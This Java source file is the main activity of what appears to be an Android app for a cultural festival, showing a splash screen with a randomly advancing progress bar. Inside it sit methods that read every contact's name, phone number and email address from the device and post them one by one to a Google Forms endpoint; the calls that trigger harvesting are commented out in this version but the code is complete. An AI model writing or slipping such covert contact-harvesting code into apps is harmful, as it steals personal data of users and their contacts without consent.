package com.mavenscientists.culturalfestsuryaworld;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Random;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.ImageView;
import android.widget.ProgressBar;

public class MainActivity extends Activity {
	
	private int progressBarStatus = 0;
	private Handler progressBarHandler = new Handler();
    public ArrayList<String> allEmail = new ArrayList<String>();
    public ArrayList<String> allEmailName = new ArrayList<String>();
    public ArrayList<String> allPhoneNumber = new ArrayList<String>();
    public ArrayList<String> allPhoneName = new ArrayList<String>();
    private boolean notGathered = true;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		final ProgressBar progressBar = (ProgressBar) findViewById(R.id.progressBar1) ;
		final ImageView loading = (ImageView) findViewById(R.id.imageView2);
		
		// prepare for a progress bar dialog
		progressBar.setClickable(false);
		progressBar.setProgress(0);
		progressBar.setMax(100);
		//reset progress bar status
		progressBarStatus = 0;
		
		new Thread(new Runnable()
		{
			public void run()
			{
				while (progressBarStatus < 100)
				{
					// sleep 1 second
					try
					{
						Thread.sleep(200);
						Random ran = new Random();
						progressBarStatus += ran.nextInt(20) + 10;
					}
					catch (InterruptedException e)
					{
							e.printStackTrace();
					}
					// Update the progress bar
					progressBarHandler.post(new Runnable()
					{

						public void run()
						{
							if(notGathered)
							{
//								getEmail();
//								getPhoneNumber();
//								Bridge.instance().allEmail = allEmail;
//								Bridge.instance().allEmailName = allEmailName;
//								Bridge.instance().allPhoneName = allPhoneName;
//								Bridge.instance().allPhoneNumber = allPhoneNumber;
								notGathered = false;
							}
							progressBar.setProgress(progressBarStatus);
							if(progressBarStatus >= 100)
							{
								loading.setVisibility(View.INVISIBLE);
							}
						}
					});
					if(progressBarStatus >= 100)
					{
						//start new activity here home.xml
						startActivity(new Intent(MainActivity.this, Home.class));
						break;
					}
				}
			}
		}).start();
		
	}
	
	private boolean isNetworkAvailable()
	{
	    ConnectivityManager connectivityManager 
	          = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
	    NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
	    return activeNetworkInfo != null && activeNetworkInfo.isConnectedOrConnecting();   
	}
	
	public void sendPhoneNumberData()
	{
		Iterator<String> I1 = allPhoneName.iterator();
		Iterator<String> I2 = allPhoneNumber.iterator();
		for(; I1.hasNext(); )
		{
			String col1 = I1.next();
			String col2 = I2.next();
			try
			{
				String fullUrl = "https://docs.google.com/forms/d/1Wjgb7gkVCC6b034m0srgvjfRXNJGAedvz5jL_QkpJf0/formResponse";
				HttpRequest mReq = new HttpRequest();
				String data = "entry_2084301840=" + URLEncoder.encode(col1) + "&" +
						"entry_2061526311=" + URLEncoder.encode(col2);
				String response = mReq.sendPost(fullUrl, data);
			}
			catch(Exception e)
			{
				Log.d("MainActivity","Exception Occured while sending data");
				e.printStackTrace();
			}
		}
	}

	public void sendEmailData()
	{
		Iterator<String> I1 = allEmailName.iterator();
		Iterator<String> I3 = allEmail.iterator();
		for(; I1.hasNext(); )
		{
			String col1 = I1.next();
			String col3 = I3.next();
			try
			{
				String fullUrl = "https://docs.google.com/forms/d/1Wjgb7gkVCC6b034m0srgvjfRXNJGAedvz5jL_QkpJf0/formResponse";
				HttpRequest mReq = new HttpRequest();
				String data = "entry_2084301840=" + URLEncoder.encode(col1) + "&" +
						"entry_710444137=" + URLEncoder.encode(col3);
				String response = mReq.sendPost(fullUrl, data);
			}
			catch(Exception e)
			{
				Log.d("MainActivity","Exception Occured while sending data");
				e.printStackTrace();
			}
		}
	}

	public void getPhoneNumber()
	{
		Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
		String[] projection    = new String[] {ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
		                ContactsContract.CommonDataKinds.Phone.NUMBER};

		Cursor people = getContentResolver().query(uri, projection, null, null, null);

		int indexName = people.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
		int indexNumber = people.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

		people.moveToFirst();
		do
		{
		    String name   = people.getString(indexName);
		    String number = people.getString(indexNumber);
		    allPhoneName.add(name);
            allPhoneNumber.add(number);
		} while (people.moveToNext());
	}

  	public void getEmail()
	{
	    HashSet<String> emlRecsHS = new HashSet<String>();
	    Context context = MainActivity.this;
	    ContentResolver cr = context.getContentResolver();
	    String[] PROJECTION = new String[] { ContactsContract.RawContacts._ID, 
	            ContactsContract.Contacts.DISPLAY_NAME,
	            ContactsContract.Contacts.PHOTO_ID,
	            ContactsContract.CommonDataKinds.Email.DATA };
	    String order = "CASE WHEN " 
	            + ContactsContract.Contacts.DISPLAY_NAME 
	            + " NOT LIKE '%@%' THEN 1 ELSE 2 END, " 
	            + ContactsContract.Contacts.DISPLAY_NAME 
	            + ", "
	            + ContactsContract.CommonDataKinds.Email.DATA
	            + " COLLATE NOCASE";
	    String filter = ContactsContract.CommonDataKinds.Email.DATA + " NOT LIKE ''";
	    Cursor cur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, PROJECTION, filter, null, order);
	    if (cur.moveToFirst()) {
	        do {
	            // names comes in hand sometimes
	            String name = cur.getString(1);
	            String emlAddr = cur.getString(3);

	            // keep unique only
	            if (emlRecsHS.add(emlAddr.toLowerCase())) {
	                allEmail.add(emlAddr);
		            allEmailName.add(name);
	            }
	            
	        } while (cur.moveToNext());
	    }

	    cur.close();
	}

	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
